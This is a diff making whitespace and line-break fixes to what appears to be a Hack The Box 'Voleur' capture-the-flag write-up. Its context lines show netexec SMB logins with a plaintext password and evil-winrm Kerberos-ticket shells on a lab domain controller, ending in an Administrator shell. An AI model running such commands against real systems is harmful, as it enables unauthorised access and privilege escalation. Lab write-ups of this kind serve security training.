@@ -223,6 +223,7 @@ $ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.ht
 $ sudo cp krb5.conf /etc/krb5.conf              
 $ evil-winrm -i dc.voleur.htb -u 'svc_winrm' -r VOLEUR.HTB
 <SNIP>
+
 *Evil-WinRM* PS C:\Users\svc_winrm\Documents>  
 ```
 
@@ -412,7 +413,7 @@ Password:
 [*] Saving ticket in jeremy.combs.ccache
 
 $ export KRB5CCNAME=jeremy.combs.ccache
-$ evil-winrm -i dc.voleur.htb -u 'jeremy.combs'  -r VOLEUR.HTB
+$ evil-winrm -i dc.voleur.htb -u 'jeremy.combs' -r VOLEUR.HTB
 <SNIP>
 
 *Evil-WinRM* PS C:\Users\jeremy.combs\Documents>  
@@ -556,7 +557,8 @@ So indeed that works. NTLM authentication is disabled, but we didn't attempt to 
 We just tried, it just worked, and we're done:
 ```
 $ export KRB5CCNAME=Administrator.ccache
-$ evil-winrm -i dc.voleur.htb -u 'Administrator'  -r VOLEUR.HTB                <SNIP>
+$ evil-winrm -i dc.voleur.htb -u 'Administrator' -r VOLEUR.HTB
+<SNIP>
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents>  
 ```
